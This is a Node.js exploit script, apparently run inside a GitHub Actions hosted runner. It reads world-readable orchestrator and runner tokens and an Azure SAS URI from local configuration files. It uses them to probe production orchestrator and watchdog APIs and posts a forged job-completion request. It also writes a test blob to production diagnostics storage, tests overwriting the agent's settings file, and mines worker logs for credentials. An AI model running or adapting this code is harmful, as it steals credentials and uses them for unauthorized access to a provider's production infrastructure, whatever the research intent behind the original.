const https = require('https');
const http = require('http');
const fs = require('fs');
const { execSync } = require('child_process');

// v26: Exploit authToken from /opt/hca/.settings
// CRITICAL FINDINGS from v25:
//   /opt/hca/.settings is WORLD-READABLE AND WORLD-WRITABLE (-rw-rw-rw-+)
//   Contains:
//     authToken: JWT for hosted-compute-request-orchestrator-prod-iad-01.githubapp.com
//     diagnosticsSasUri: Signed Azure Blob SAS URL with acw (append/create/write) perms
//     schedulerApiUrl: https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/v1
//     traceApiUrl: https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/v1/trace
//     configId: Ubuntu24-us-small
//     quotaId: azure-westcentralus-general-ef24885f-1cc2-4837-aac5-0d176f2c6bf3
//   .credentials also world-readable (runner OAuth JWT, scheme=OAuthAccessToken)

function run(cmd) {
  try { return execSync(cmd, { encoding: 'utf8', timeout: 8000 }).trim(); }
  catch(e) { return 'ERR: ' + (e.stderr || e.message || '').substring(0, 120).trim(); }
}

function req(hostname, path, method, token, body, extraHeaders) {
  return new Promise((resolve) => {
    const hdrs = { 'User-Agent': 'hosted-compute-agent/20260611.554', 'Accept': 'application/json', ...(extraHeaders || {}) };
    if (token) hdrs['Authorization'] = 'Bearer ' + token;
    let data = null;
    if (body) { data = JSON.stringify(body); hdrs['Content-Type'] = 'application/json'; hdrs['Content-Length'] = Buffer.byteLength(data); }
    const r = https.request({ hostname, path, method: method || 'GET', headers: hdrs, timeout: 10000 },
      (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 1000), headers: res.headers })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.on('timeout', () => { r.destroy(); resolve({ status: 'TIMEOUT', body: '' }); });
    if (data) r.write(data);
    r.end();
  });
}

async function main() {
  console.log('=== V26: HCA authToken orchestrator probe + SAS URI exploit ===');

  // Load settings
  const settings = JSON.parse(fs.readFileSync('/opt/hca/.settings', 'utf8'));
  const authToken = settings.authToken;
  const sasUri = settings.diagnosticsSasUri;
  const schedulerUrl = settings.schedulerApiUrl;
  const traceUrl = settings.traceApiUrl;
  const watchdogUrl = settings.watchdogTraceApiUrl;
  const configId = settings.configId;
  const quotaId = settings.quotaId;
  const workerId = run('cat /home/runner/actions-runner/cached/2.335.1/_diag/pages/*.log 2>/dev/null | grep "Worker ID:" | head -1');

  // Also load runner credentials
  const runnerCreds = JSON.parse(fs.readFileSync('/home/runner/actions-runner/cached/2.335.1/.credentials', 'utf8'));
  const runnerToken = runnerCreds.Data.token;

  console.log('[SETTINGS] schedulerApiUrl:', schedulerUrl);
  console.log('[SETTINGS] configId:', configId);
  console.log('[SETTINGS] quotaId:', quotaId);
  console.log('[SETTINGS] workerId (from diag log):', workerId);
  console.log('[AUTH] authToken length:', authToken ? authToken.length : 0);
  console.log('[AUTH] authToken prefix (first 10):', authToken ? authToken.substring(0, 10) : 'N/A');
  console.log('[CREDS] runnerToken length:', runnerToken ? runnerToken.length : 0);
  console.log('[CREDS] runnerToken prefix (first 10):', runnerToken ? runnerToken.substring(0, 10) : 'N/A');

  // Decode the authToken JWT (without printing it)
  if (authToken) {
    const parts = authToken.split('.');
    if (parts.length >= 2) {
      try {
        const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
        const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
        console.log('\n[AUTH_JWT] Header:', JSON.stringify(header));
        console.log('[AUTH_JWT] Payload fields:', Object.keys(payload).join(', '));
        // Print payload without sensitive values
        for (const [k, v] of Object.entries(payload)) {
          if (k === 'exp' || k === 'iat' || k === 'nbf') {
            console.log('[AUTH_JWT]   ' + k + ' = ' + v + ' (' + new Date(v * 1000).toISOString() + ')');
          } else if (typeof v === 'string' && v.length > 50) {
            console.log('[AUTH_JWT]   ' + k + ' = [len=' + v.length + '] ' + v.substring(0, 30) + '...');
          } else {
            console.log('[AUTH_JWT]   ' + k + ' = ' + JSON.stringify(v));
          }
        }
      } catch(e) { console.log('[AUTH_JWT] decode error:', e.message); }
    }
  }

  // === PART 1: Probe hosted-compute-request-orchestrator API ===
  console.log('\n=== PART 1: Orchestrator API probe ===');
  const orchHost = 'hosted-compute-request-orchestrator-prod-iad-01.githubapp.com';

  const orchPaths = [
    '/v1',
    '/v1/health',
    '/v1/status',
    '/v1/trace',
    '/v1/jobs',
    '/v1/runners',
    '/v1/machines',
    '/v1/requests',
    '/v1/agents',
    '/v1/pools',
    '/v1/queues',
    '/v1/quota',
    '/v1/quotas',
    '/v1/sessions',
    '/v1/instance',
    '/v1/instances',
    '/v1/vm',
    '/v1/vms',
    '/v1/workers',
    '/v1/worker/' + (workerId.split(' ').pop() || 'unknown'),
    '/v1/config',
    '/v1/configs',
    '/v1/complete',
    '/v1/result',
    '/v1/results',
    '/v1/metrics',
    '/v1/events',
    '/v1/logs',
    '/v1/telemetry',
  ];

  for (const path of orchPaths) {
    const r = await req(orchHost, path, 'GET', authToken);
    if (r.status !== 'ERR' && r.status !== 'TIMEOUT' && r.status !== 404) {
      const label = (r.status === 200 || r.status === 201 || r.status === 202) ? ' ***200 SUCCESS***' : '';
      console.log('[ORCH] GET ' + path + ': ' + r.status + label + ' | ' + r.body.substring(0, 200));
    } else if (r.status === 404) {
      // Silently skip 404s to reduce noise
    } else {
      console.log('[ORCH] GET ' + path + ': ' + r.status);
    }
  }

  // Try POST endpoints (trace/telemetry submission)
  console.log('\n[ORCH_POST] Testing POST endpoints:');
  // Trace endpoint is what the HCA normally uses to report status
  const traceR = await req(orchHost, '/v1/trace', 'POST', authToken, {
    level: 'INFO', message: 'probe test', timestamp: Date.now() / 1000
  });
  console.log('[ORCH_POST] POST /v1/trace:', traceR.status, '|', traceR.body.substring(0, 200));

  // Complete endpoint — try to mark this job as complete
  const completeR = await req(orchHost, '/v1/complete', 'POST', authToken, {
    workerId: workerId, result: 'succeeded', jobName: 'probe'
  });
  console.log('[ORCH_POST] POST /v1/complete:', completeR.status, '|', completeR.body.substring(0, 200));

  // === PART 2: Probe hosted-compute-watchdog API ===
  console.log('\n=== PART 2: Watchdog API probe ===');
  const watchdogHost = 'hosted-compute-watchdog-prod-iad-01.githubapp.com';
  const watchdogPaths = ['/v1', '/v1/health', '/v1/trace', '/v1/status', '/v1/jobs', '/v1/instances'];
  for (const path of watchdogPaths) {
    const r = await req(watchdogHost, path, 'GET', authToken);
    if (r.status !== 'ERR' && r.status !== 'TIMEOUT') {
      console.log('[WATCHDOG] GET ' + path + ': ' + r.status + ' | ' + r.body.substring(0, 150));
    }
  }

  // === PART 3: Exploit the diagnostics SAS URI ===
  console.log('\n=== PART 3: Azure Blob SAS URI exploitation ===');
  if (sasUri) {
    const sasUrl = new URL(sasUri);
    const blobHost = sasUrl.hostname;  // hcrpprodiad01diag.blob.core.windows.net
    const containerPath = sasUrl.pathname;
    const sasParams = sasUrl.search;

    console.log('[SAS] Storage account:', blobHost);
    console.log('[SAS] Container path:', containerPath);
    console.log('[SAS] Permissions (sp=):', (sasUri.match(/sp=([^&]+)/) || [])[1]);
    console.log('[SAS] Expiry (se=):', (sasUri.match(/se=([^&]+)/) || [])[1]);

    // Try to LIST blobs in the container (even though sp=acw doesn't include 'l')
    // Sometimes Azure APIs return list info anyway
    const listR = await new Promise((resolve) => {
      const url = sasUri + '&restype=container&comp=list';
      const u = new URL(url);
      const r = https.request({ hostname: u.hostname, path: u.pathname + u.search, method: 'GET', headers: { 'User-Agent': 'probe' } },
        (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 500) })); });
      r.on('error', e => resolve({ status: 'ERR', body: e.message }));
      r.on('timeout', () => { r.destroy(); resolve({ status: 'TIMEOUT', body: '' }); });
      r.setTimeout(5000);
      r.end();
    });
    console.log('[SAS_LIST] Container list:', listR.status, '|', listR.body.substring(0, 300));

    // Try to read blobs (sp=acw doesn't include r, but test anyway)
    const readR = await new Promise((resolve) => {
      const url = sasUri + '&comp=list&restype=container';
      const u = new URL(url);
      const r = https.request({ hostname: u.hostname, path: u.pathname + u.search + '&maxresults=5', method: 'GET', headers: { 'User-Agent': 'probe' } },
        (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 500) })); });
      r.on('error', e => resolve({ status: 'ERR', body: e.message }));
      r.on('timeout', () => { r.destroy(); resolve({ status: 'TIMEOUT', body: '' }); });
      r.setTimeout(5000);
      r.end();
    });
    console.log('[SAS_LIST2] Container list (v2):', readR.status, '|', readR.body.substring(0, 200));

    // Try to WRITE a test blob (sp=acw gives create+write perms)
    const testBlobPath = containerPath + '/probe-test-v26.txt' + sasParams;
    const writeR = await new Promise((resolve) => {
      const body = Buffer.from('probe-test-' + Date.now());
      const r = https.request({ hostname: blobHost, path: testBlobPath, method: 'PUT',
        headers: { 'Content-Type': 'text/plain', 'Content-Length': body.length, 'x-ms-blob-type': 'BlockBlob', 'User-Agent': 'probe' } },
        (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 300), headers: res.headers })); });
      r.on('error', e => resolve({ status: 'ERR', body: e.message }));
      r.on('timeout', () => { r.destroy(); resolve({ status: 'TIMEOUT', body: '' }); });
      r.setTimeout(5000);
      r.write(body);
      r.end();
    });
    console.log('[SAS_WRITE] PUT blob:', writeR.status, '|', writeR.body.substring(0, 200));
    if (writeR.status === 201) {
      console.log('[SAS_WRITE] *** WRITE SUCCEEDED *** — proved write access to GitHub production diagnostics storage!');
    }
  }

  // === PART 4: Can we modify .settings to redirect HCA calls? ===
  console.log('\n=== PART 4: .settings writability test ===');
  try {
    const original = fs.readFileSync('/opt/hca/.settings', 'utf8');
    const parsed = JSON.parse(original);
    // Test: try writing back the same content (proves writability without modification)
    fs.writeFileSync('/opt/hca/.settings', original, 'utf8');
    console.log('[WRITABLE] /opt/hca/.settings IS writable! Can modify HCA configuration.');
    console.log('[WRITABLE] Writability confirmed — restored original content');
  } catch(e) {
    console.log('[WRITABLE] Write test failed:', e.message);
  }

  // === PART 5: Read Worker diagnostic log ===
  console.log('\n=== PART 5: Worker_*.log diagnostic content (credential search) ===');
  const workerLog = run('find /home/runner/actions-runner/cached/2.335.1/_diag -name "Worker_*.log" 2>/dev/null | head -1');
  if (workerLog && !workerLog.startsWith('ERR:')) {
    console.log('[WORKER_LOG] Path:', workerLog);
    const logContent = fs.readFileSync(workerLog, 'utf8');
    console.log('[WORKER_LOG] Size:', logContent.length, 'bytes');
    // Search for credential-related content
    const lines = logContent.split('\n');
    const credLines = lines.filter(l => /token|secret|credential|bearer|authori|password|key|jwt|oauth|hmac/i.test(l) && !/^\s*\/\//.test(l));
    console.log('[WORKER_LOG] Credential-related lines (' + credLines.length + '):');
    credLines.slice(0, 20).forEach(l => console.log('  ' + l.substring(0, 200)));

    // Also search for endpoint URLs
    const urlLines = lines.filter(l => /https?:\/\//i.test(l)).slice(0, 30);
    console.log('\n[WORKER_LOG] URLs found (' + urlLines.length + ' total, first 15):');
    urlLines.slice(0, 15).forEach(l => console.log('  ' + l.substring(0, 200)));
  }

  // === PART 6: Decode the runner .credentials JWT fully ===
  console.log('\n=== PART 6: Runner .credentials JWT decode ===');
  if (runnerToken) {
    const parts = runnerToken.split('.');
    if (parts.length >= 2) {
      try {
        const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
        const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
        console.log('[RUNNER_JWT] Header:', JSON.stringify(header));
        console.log('[RUNNER_JWT] Payload:');
        for (const [k, v] of Object.entries(payload)) {
          if (k === 'exp' || k === 'iat' || k === 'nbf') {
            console.log('[RUNNER_JWT]   ' + k + ' = ' + v + ' (' + new Date(v * 1000).toISOString() + ')');
          } else if (typeof v === 'string' && v.length > 80) {
            console.log('[RUNNER_JWT]   ' + k + ' = [len=' + v.length + '] ' + v.substring(0, 40) + '...');
          } else {
            console.log('[RUNNER_JWT]   ' + k + ' = ' + JSON.stringify(v));
          }
        }
      } catch(e) { console.log('[RUNNER_JWT] decode error:', e.message); }
    }
  }

  // === PART 7: Full HCA log content ===
  console.log('\n=== PART 7: Full HCA log ===');
  const hcaLog = fs.readFileSync('/opt/hca/logs/hosted-compute-agent.log', 'utf8');
  // Print entire log (it was 12KB)
  console.log('[HCA_LOG] Full content (' + hcaLog.length + ' bytes):');
  console.log(hcaLog);

  console.log('\nDone.');
}

main().catch(e => console.log('Fatal:', e.message, e.stack));
